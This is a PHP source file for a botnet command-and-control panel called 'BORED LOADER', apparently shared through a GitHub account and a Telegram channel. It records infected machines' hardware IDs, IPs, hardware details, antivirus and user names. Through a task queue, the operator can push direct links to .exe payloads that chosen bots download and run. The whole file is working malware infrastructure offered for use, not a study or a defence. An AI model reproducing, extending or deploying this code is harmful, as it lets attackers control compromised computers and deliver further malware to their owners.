<?php
session_start();
date_default_timezone_set('UTC');

//////////////////////////////////////////////////////////////
// https://github.com/endrophys - https://t.me/botnetloader //
//////////////////////////////////////////////////////////////

// Don't be a skid

// CHANGE YOUR PASSWORD FROM THE DEFAULT ONE
// pwd: Ku1bXGc7Nf2FlXD5eIZrT3nxwsH5S1at (https://www.random.org/strings/)
// hash: c05f8ea681eb6b7ba21dca6431d5e6d4de8ec27bd8a42c5e95fb10a6c1ac6197
// https://emn178.github.io/online-tools/sha256.html (any sha256 hasher thingy works)

//ADMIN PASSWORD
$PASSWORD_HASH = "c05f8ea681eb6b7ba21dca6431d5e6d4de8ec27bd8a42c5e95fb10a6c1ac6197";

//DB SETTINGS
$DATABASE_ADDR = "127.0.0.1:3306";
$DATABASE_USER = "root";
$DATABASE_PASS = "";
$DATABASE_NAME = "bored_db";

$DB_CONN = initialize_database_conn($DATABASE_ADDR, $DATABASE_USER, $DATABASE_PASS, $DATABASE_NAME);

function initialize_database_conn(string $addr, string $user, string $pass, string $name) {
    try {
        $conn = new mysqli($addr, $user, $pass, $name);
        if ($conn->connect_error) {
            echo "Database Error";
            exit();
        }
        $conn->query("SET time_zone = '+00:00'");
        return $conn;
    } catch (mysqli_sql_exception $e) {
        echo "Database Error";
        exit();
    }
}

function initialize_database(mysqli $conn) {
    $check_bots = $conn->query("SHOW TABLES LIKE 'bots'");

    if ($check_bots->num_rows == 0) {
        $sql = "
        CREATE TABLE IF NOT EXISTS bots (
            id INT AUTO_INCREMENT PRIMARY KEY,
            hwid VARCHAR(255) NOT NULL,
            ip VARCHAR(45),
            cpu VARCHAR(100),
            gpu VARCHAR(100),
            os VARCHAR(50),
            av VARCHAR(100),
            user_name VARCHAR(100),
            last_ping TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
            UNIQUE (hwid)
        );
        ";

        if ($conn->multi_query($sql)) {
            do { if ($res = $conn->store_result()) { $res->free(); } } 
            while ($conn->more_results() && $conn->next_result());
        } else {
            echo "Database Error (create table)";
            exit();
        }
    }

    $check_tasks = $conn->query("SHOW TABLES LIKE 'tasks'");

    if ($check_tasks->num_rows == 0) {
        $sql = "
        CREATE TABLE IF NOT EXISTS tasks (
            id INT AUTO_INCREMENT PRIMARY KEY,
            hwid VARCHAR(255) NOT NULL,
            url VARCHAR(255) NOT NULL,
            status VARCHAR(20) NOT NULL,
            last_ping TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
        );
        ";

        if ($conn->multi_query($sql)) {
            do { if ($res = $conn->store_result()) { $res->free(); } } 
            while ($conn->more_results() && $conn->next_result());
        } else {
            echo "Database Error (create table)";
            exit();
        }
    }
}

function insert_update_bot(mysqli $conn, mixed $data) {
    if (!$data || !is_array($data)) {
        return false;
    }

    $field_limits = [
        'hwid' => 255,
        'ip'   => 45,
        'cpu'  => 100,
        'gpu'  => 100,
        'os'   => 50,
        'av'   => 100,
        'user' => 100
    ];

    foreach ($field_limits as $field => $max_length) {
        if (!isset($data[$field])) {
            return false;
        }

        $val = trim((string)$data[$field]);
        if ($val === '') {
            return false;
        }
        if (strlen($val) > $max_length) {
            return false;
        }
        $data[$field] = $val;
    }

    $sql = "INSERT INTO bots (hwid, ip, cpu, gpu, os, av, user_name) 
            VALUES (?, ?, ?, ?, ?, ?, ?)
            ON DUPLICATE KEY UPDATE 
            ip = VALUES(ip),
            av = VALUES(av), 
            user_name = VALUES(user_name),
            last_ping = CURRENT_TIMESTAMP";

    $stmt = $conn->prepare($sql);
    if (!$stmt) return false;

    $stmt->bind_param(
        "sssssss", 
        $data['hwid'], 
        $data['ip'], 
        $data['cpu'], 
        $data['gpu'], 
        $data['os'], 
        $data['av'], 
        $data['user']
    );

    $success = $stmt->execute();
    $stmt->close();
    
    return $success;
}

function get_tasks(mysqli $conn, string $hwid) {
    $sql_ping = "UPDATE bots SET last_ping = CURRENT_TIMESTAMP WHERE hwid = ?";
    $pingStmt = $conn->prepare($sql_ping);
    if ($pingStmt) {
        $pingStmt->bind_param("s", $hwid);
        $pingStmt->execute();
        $pingStmt->close();
    }
    $sql_select = "SELECT id, url FROM tasks WHERE hwid = ? AND status = 'pending'";
    $stmt = $conn->prepare($sql_select);
    if (!$stmt) return [];

    $stmt->bind_param("s", $hwid);
    $stmt->execute();
    $result = $stmt->get_result();

    $taskList = [];
    $taskIds = [];

    while ($row = $result->fetch_assoc()) {
        $taskList[] = ['url' => $row['url']];
        $taskIds[] = $row['id'];
    }
    $stmt->close();

    if (!empty($taskIds)) {
        foreach ($taskIds as $id) {
            $sql_update = "UPDATE tasks SET status = 'sent' WHERE id = ?";
            $updateStmt = $conn->prepare($sql_update);
            $updateStmt->bind_param("i", $id);
            $updateStmt->execute();
            $updateStmt->close();
        }
    }

    return $taskList;
}

function add_task(mysqli $conn, string $hwid, string $url) {
    $hwid = trim((string)$hwid);
    $url = trim((string)$url);

    if (empty($hwid) || empty($url)) {
        return false;
    }

    $sql = "INSERT INTO tasks (hwid, url, status) VALUES (?, ?, 'pending')";
    
    $stmt = $conn->prepare($sql);
    if (!$stmt) {
        return false;
    }

    $stmt->bind_param("ss", $hwid, $url);
    $success = $stmt->execute();
    
    $stmt->close();
    return $success;
}

function display_bots(mysqli $conn) {
    $sql = "SELECT * FROM bots ORDER BY last_ping DESC";
    $result = $conn->query($sql);

    if ($result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            $last_ping_time = strtotime($row['last_ping']);
            $diff = time() - $last_ping_time;
            
            if ($diff < 60) {
                $time_ago = "few seconds ago";
            } elseif ($diff < 3600) {
                $time_ago = round($diff / 60) . " min ago";
            } else {
                $time_ago = round($diff / 3600) . " hours ago";
            }

            echo '<tr>
                <td>' . htmlspecialchars($row['id']) . '</td>
                <td>' . htmlspecialchars($row['hwid']) . '</td>
                <td>' . htmlspecialchars($row['ip']) . '</td>
                <td>' . htmlspecialchars($row['cpu']) . '</td>
                <td>' . htmlspecialchars($row['gpu']) . '</td>
                <td>' . htmlspecialchars($row['os']) . '</td>
                <td>' . htmlspecialchars($row['av']) . '</td>
                <td>' . htmlspecialchars($row['user_name']) . '</td>
                <td>' . $time_ago . '</td>
                <td>
                    <a class="btn-action" href="index.php?page=task&hwid='.$row['hwid'].'"><i class="material-icons">cloud_download</i></a>
                    <a class="btn-action" href="index.php?page=info&hwid='.$row['hwid'].'"><i class="material-icons">schedule</i></a>
                </td>
            </tr>';
        }
    } else {
        echo '<tr><td colspan="10" style="text-align:center;">No bots connected yet.</td></tr>';
    }
}

function cancel_task(mysqli $conn, int $id) {
    $id = (int)$id;
    if ($id <= 0) return false;

    $sql = "UPDATE tasks SET status = 'canceled', last_ping = CURRENT_TIMESTAMP 
            WHERE id = ? AND status = 'pending'";
    
    $stmt = $conn->prepare($sql);
    if (!$stmt) return false;

    $stmt->bind_param("i", $id);
    $success = $stmt->execute();
    
    $stmt->close();
    return $success;
}

function display_tasks(mysqli $conn, string $hwid) {
    $stmt = $conn->prepare("SELECT * FROM tasks WHERE hwid = ? ORDER BY last_ping DESC");
    $stmt->bind_param("s", $hwid);
    $stmt->execute();
    $result = $stmt->get_result();

    if ($result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            $status = $row['status'];
            
            if ($status == 'sent') {
                $status_class = 'status-sent';
                $status_text = 'SENT';
            } elseif ($status == 'canceled') {
                $status_class = 'offline';
                $status_text = 'CANCELED';
            } else {
                $status_class = 'status-pending';
                $status_text = 'PENDING';
            }

            echo '<tr>
                <td>' . htmlspecialchars($row['id']) . '</td>
                <td>' . htmlspecialchars($row['url']) . '</td>
                <td class="' . $status_class . '">' . $status_text . '</td>
                <td>' . $row['last_ping'] . '</td>
                <td>';
                
            if ($status == 'pending') {
                echo '<a class="btn-cancel" href="index.php?page=info_cancel&id='.$row['id'].'&hwid='.$hwid.'">Cancel</a>';
            } else {
                echo '-';
            }

            echo '</td></tr>';
        }
    } else {
        echo '<tr><td colspan="5" style="text-align:center;">No tasks assigned to this device.</td></tr>';
    }
    $stmt->close();
}

function display_bot_info(mysqli $conn, string $hwid) {
    $stmt = $conn->prepare("SELECT * FROM bots WHERE hwid = ? LIMIT 1");
    $stmt->bind_param("s", $hwid);
    $stmt->execute();
    $result = $stmt->get_result();

    if ($bot = $result->fetch_assoc()) {
        echo '<li><b>HWID:</b> ' . htmlspecialchars($bot['hwid']) . '</li>';
        echo '<li><b>IP:</b> ' . htmlspecialchars($bot['ip']) . '</li>';
        echo '<li><b>OS:</b> ' . htmlspecialchars($bot['os']) . '</li>';
        echo '<li><b>AV:</b> ' . htmlspecialchars($bot['av']) . '</li>';
        echo '<li><b>CPU:</b> ' . htmlspecialchars($bot['cpu']) . '</li>';
        echo '<li><b>GPU:</b> ' . htmlspecialchars($bot['gpu']) . '</li>';
        echo '<li><b>User:</b> ' . htmlspecialchars($bot['user_name']) . '</li>';
        echo '<li><b>Last Seen:</b> ' . $bot['last_ping'] . '</li>';
    } else {
        echo '<li>Bot not found.</li>';
    }
    $stmt->close();
}

function display_stats(mysqli $conn) {
    $sql = "SELECT 
                COUNT(*) as total,
                SUM(CASE WHEN last_ping >= NOW() - INTERVAL 1 MINUTE THEN 1 ELSE 0 END) as online_count,
                SUM(CASE WHEN last_ping < NOW() - INTERVAL 1 MINUTE THEN 1 ELSE 0 END) as offline_count
            FROM bots";
            
    $result = $conn->query($sql);
    $stats = $result->fetch_assoc();

    $total = $stats['total'] ?? 0;
    $online = $stats['online_count'] ?? 0;
    $offline = $stats['offline_count'] ?? 0;

    echo '<div class="stat-box online">Online(1min): ' . $online . '</div>';
    echo '<div class="stat-box offline">Offline: ' . $offline . '</div>';
    echo '<div class="stat-box total">Total: ' . $total . '</div>';
}

if ($_SERVER["REQUEST_METHOD"] == "GET") {
    handle_get();
}
else if ($_SERVER["REQUEST_METHOD"] === "POST") {
    handle_post();
} else {exit();}

function handle_get() {
    $page = $_GET['page'] ?? '';
    $is_logged_in = (isset($_SESSION['init']) && $_SESSION['init'] === "1");

    if (!$is_logged_in && $page !== 'login') {
        header("Location: ?page=login");
        exit();
    }

    if ($page === 'login') {
        if ($is_logged_in) {
            header("Location: ?page=dash");
            exit();
        }
        handle_login();
    } 
    elseif ($page === 'dash') {
        initialize_database($GLOBALS["DB_CONN"]);
        handle_dash();
    }
    elseif ($page === 'task') {
        handle_task();
    }
    elseif ($page === 'info') {
        handle_info();
    }
    elseif ($page === 'info_cancel') {
        handle_info_cancel();
    }
    else {
        header("Location: ?page=dash");
        exit();
    }
}

function handle_post() {
    $api_action = $_GET['api'] ?? '';

    if ($api_action === "login") {
        $password = $_POST['password'] ?? '';
        $hashed_input = hash('sha256', $password);
    
        if ($hashed_input === $GLOBALS["PASSWORD_HASH"]) {
            $_SESSION["init"] = "1";
            header("Location: ?page=dash");
            exit();
        } else {
            header("Location: ?page=login");
            exit();
        }
    } else if ($api_action === "init") {
        $rawData = file_get_contents('php://input');
        $data = json_decode($rawData, true);
        if (insert_update_bot($GLOBALS["DB_CONN"], $data)) {
            echo "OK";
            exit();
        } else {
            exit();
        }
    } else if ($api_action === "task") {
        $rawData = file_get_contents('php://input');
        $data = json_decode($rawData, true);
        $hwid = $data['hwid'] ?? '';

        header('Content-Type: application/json');
        if (empty($hwid)) {
            echo json_encode([]);
            exit();
        } else {
            $tasks = get_tasks($GLOBALS["DB_CONN"], $hwid);
            echo json_encode($tasks);
            exit();
        }
    } else if ($api_action === "add_task") {
        $is_logged_in = (isset($_SESSION['init']) && $_SESSION['init'] === "1");
        if (!$is_logged_in) {
            header("Location: ?page=login");
            exit();
        }
        else {
            $target_hwid = $_POST['hwid'];
            $download_url = $_POST['url'];

            if (add_task($GLOBALS["DB_CONN"], $target_hwid, $download_url)) {
                echo "Task queued successfully!</br>";
                echo '<a class="btn-action" href="index.php?page=dash">Click here to go back to the dashboard.</a>';
                exit();
            } else {
                echo "Error adding task.</br>";
                echo '<a class="btn-action" href="index.php?page=dash">Click here to go back to the dashboard.</a>';
                exit();
            }
        }
    } else {
        exit();
    }
}

function handle_task() {
    echo '<!DOCTYPE html>
<html>
    <head>
        <title>BORED LOADER :3</title>
    </head>
    <body>
        <div class="main">
            <form action="index.php?api=add_task" method="POST">
                <input type="text" name="url" placeholder="DIRECT LINK TO .EXE"></br>
                <input type="text" name="hwid" value="'.$_GET["hwid"].'" hidden></br>
                <input type="submit">
            </form>
            ';echo '<a class="btn-action" href="index.php?page=dash">Click here to go back to the dash</a>';echo'
        </div>
    </body>
</html>';
    exit();
}

function handle_info_cancel() {
    if (isset($_GET['id']) && isset($_GET['hwid'])) {
        if (cancel_task($GLOBALS["DB_CONN"], $_GET['id'])) {
            header("Location: ?page=info&hwid=".$_GET['hwid']);
            exit();
        } else {
            echo "Error cancelling task (already sent?).</br>";
            echo '<a class="btn-action" href="index.php?page=info&hwid='.$_GET['hwid'].'">Click here to go back to the info page.</a>';
        }
    } else {
        echo "Error cancelling task.</br>";
        echo '<a class="btn-action" href="index.php?page=info&hwid='.$_GET['hwid'].'">Click here to go back to the info page.</a>';
    }
}

function handle_info() {
    echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BORED LOADER :3</title>
    <style>
        body { font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; margin: 40px; background-color: #f9f9f9; color: #333; }
        
        /* Bot Info List */
        .bot-details { background: white; padding: 20px; border-radius: 6px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); margin-bottom: 30px; }
        .bot-details ul { list-style: none; padding: 0; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .bot-details li { padding: 5px 0; border-bottom: 1px solid #eee; }
        .bot-details b { color: #555; text-transform: uppercase; font-size: 12px; margin-right: 10px; }

        /* Table Section */
        table { width: 100%; border-collapse: collapse; background: white; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        th, td { padding: 8px; border: 1px solid #ddd; text-align: left; font-size: 14px; }
        th { background-color: #f2f2f2; }

        /* Status & Actions */
        .status-sent { color: #2ecc71; font-weight: bold; }
        .status-pending { color: #f39c12; font-weight: bold; }
        .btn-cancel { background-color: #e74c3c; color: white; border: none; padding: 3px 8px; border-radius: 4px; cursor: pointer; text-decoration: none;}
        
        .nav-link { text-decoration: none; color: #3498db; font-size: 14px; display: inline-block; margin-bottom: 15px; }
    </style>
</head>
<body>

    <a href="?api=dash" class="nav-link">← Back to Device List</a>

    <h2>Device Information</h2>
    <div class="bot-details">
        <ul>
            ';display_bot_info($GLOBALS["DB_CONN"], $_GET["hwid"]);echo'
        </ul>
    </div>

    <h2>Assigned Tasks</h2>
    <table>
        <thead>
            <tr>
                <th>ID</th>
                <th>Payload URL</th>
                <th>Status</th>
                <th>Last Update</th>
                <th>Action</th>
            </tr>
        </thead>
        <tbody>
            ';display_tasks($GLOBALS["DB_CONN"], $_GET["hwid"]);echo'
        </tbody>
    </table>

</body>
</html>';
    exit();
}

function handle_login() {
    echo '<!DOCTYPE html>
<html>
    <head>
        <title>BORED LOADER :3</title>
    </head>
    <body>
        <div class="main">
            <form action="index.php?api=login" method="POST">
                <input type="password" name="password" placeholder="password"></br>
                <input type="submit">
            </form>
        </div>
    </body>
</html>';
    exit();
}

function handle_dash() {
    echo '<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <title>BORED LOADER :3</title>
    <style>
        body { font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; margin: 40px; background-color: #f9f9f9; color: #333; }
        
        /* Stats Section */
        .stats-wrapper { display: flex; gap: 15px; margin-bottom: 30px; }
        .stat-box { padding: 15px 25px; border-radius: 6px; color: white; font-weight: bold; min-width: 120px; text-align: center; }
        
        .online { background-color: #2ecc71; }
        .offline { background-color: #e74c3c; }
        .total { background-color: #95a5a6; }

        /* Table Section */
        table { width: 100%; border-collapse: collapse; background: white; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        th, td { padding: 2px; border: 1px solid #ddd; text-align: left; }
        th { background-color: #f2f2f2; }
        tr:hover { background-color: #f1f1f1; }

        /* Action Button */
        .btn-action { background-color: #3498db; color: white; border: none; padding: 2px 6px; border-radius: 4px; cursor: pointer; }
        .btn-action:hover { background-color: #2980b9; }
    </style>
</head>
<body>

    <h2>Bot Statistics</h2>
    <div class="stats-wrapper">
        ';display_stats($GLOBALS["DB_CONN"]);echo'
    </div>

    <h2>Device List</h2>
    <table>
        <thead>
            <tr>
                <th>ID</th>
                <th>HWID</th>
                <th>IP</th>
                <th>CPU</th>
                <th>GPU</th>
                <th>OS</th>
                <th>AV</th>
                <th>User</th>
                <th>LAST PING</th>
                <th>Action</th>
            </tr>
        </thead>
        <tbody>
            ';display_bots($GLOBALS["DB_CONN"]);echo'
        </tbody>
    </table>
</body>
</html>';
    exit();
}